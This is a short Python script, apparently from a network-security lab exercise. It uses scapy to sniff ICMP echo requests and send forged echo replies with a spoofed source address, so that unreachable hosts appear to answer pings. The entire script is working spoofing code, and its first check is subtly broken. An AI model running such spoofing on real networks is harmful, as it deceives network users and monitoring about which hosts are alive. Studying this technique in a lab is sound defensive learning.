from scapy.all import*

def spoof(p):
    if ICMP not in p[ICMP]:
        return
    if p[ICMP].type!=8:
        return
    print("the original packet: src=",p[IP].src, " dest=",p[IP].dst)
    a=IP()
    a.src=p[IP].dst
    a.dst=p[IP].src
    a.ihl=p[IP].ihl
    b=ICMP()
    b.type=0
    b.id=p[ICMP].id
    b.seq=p[ICMP].seq
    d=p[Raw].load
    new_p=a/b/d
    print("the spoofing packet: src=",new_p[IP].src, " dest=",new_p[IP].dst)
    send(new_p,verbose=0)
    
p = sniff(iface=['lo','enp0s3'],filter='icmp', prn=spoof) 
    
    